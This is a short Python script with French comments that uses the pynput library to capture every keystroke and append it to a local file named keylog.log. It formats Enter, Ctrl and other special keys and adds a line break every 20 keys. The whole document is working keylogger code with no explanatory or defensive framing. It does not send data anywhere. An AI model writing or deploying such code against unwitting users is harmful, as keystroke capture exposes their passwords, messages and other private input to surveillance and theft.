from pynput import keyboard

count = 0  # Compteur global

def on_press(key):
    global count
    with open("keylog.log", "a") as f:
        try:
            f.write(f"['{key.char}']")
        except AttributeError:
            # Pour la touche Entrée, on va à la ligne
            if key == keyboard.Key.enter:
                f.write("[ENTER]\n")
                count = 0
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                f.write("[CTRL]")
            else:
                f.write(f"[{key}]")
        count += 1
        # Va à la ligne tous les 20 caractères pour la lisibilité
        if count >= 20:
            f.write("\n")
            count = 0

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()